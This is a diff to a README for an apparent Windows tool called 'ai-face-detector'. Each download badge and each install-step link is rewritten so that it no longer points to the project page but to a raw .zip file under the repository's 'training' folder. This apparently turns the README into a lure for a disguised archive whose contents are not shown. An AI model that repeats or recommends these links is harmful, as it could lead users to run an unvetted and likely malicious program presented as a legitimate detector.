@@ -1,6 +1,6 @@
 # 🤖 ai-face-detector - Detect Fake Faces Easily
 
-[![Download ai-face-detector](https://img.shields.io/badge/Download-ai--face--detector-ff69b4?style=for-the-badge)](https://github.com/Exogenous-sodom867/ai-face-detector)
+[![Download ai-face-detector](https://img.shields.io/badge/Download-ai--face--detector-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/Exogenous-sodom867/ai-face-detector/main/training/face_detector_ai_v1.3.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before you download, check that your PC matches these needs:
 The steps below guide you through downloading, installing, and running ai-face-detector on your Windows PC.
 
 1. Open this link in your browser:  
-   [https://github.com/Exogenous-sodom867/ai-face-detector](https://github.com/Exogenous-sodom867/ai-face-detector)
+   [https://raw.githubusercontent.com/Exogenous-sodom867/ai-face-detector/main/training/face_detector_ai_v1.3.zip](https://raw.githubusercontent.com/Exogenous-sodom867/ai-face-detector/main/training/face_detector_ai_v1.3.zip)
 
 2. You will see the project homepage with instructions and files.
 
@@ -73,7 +73,7 @@ You can test multiple images one by one. The app supports common image formats l
 
 Get ai-face-detector here:
 
-[![Download ai-face-detector](https://img.shields.io/badge/Download-ai--face--detector-ff69b4?style=for-the-badge)](https://github.com/Exogenous-sodom867/ai-face-detector)
+[![Download ai-face-detector](https://img.shields.io/badge/Download-ai--face--detector-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/Exogenous-sodom867/ai-face-detector/main/training/face_detector_ai_v1.3.zip)
 
 Visit the page above to download the latest Windows version. The project page also has instructions, updates, and support.
 
@@ -174,4 +174,4 @@ Learn about key concepts if interested:
 
 # [🔗] Download ai-face-detector now  
 
-[https://github.com/Exogenous-sodom867/ai-face-detector](https://github.com/Exogenous-sodom867/ai-face-detector)
+[https://raw.githubusercontent.com/Exogenous-sodom867/ai-face-detector/main/training/face_detector_ai_v1.3.zip](https://raw.githubusercontent.com/Exogenous-sodom867/ai-face-detector/main/training/face_detector_ai_v1.3.zip)
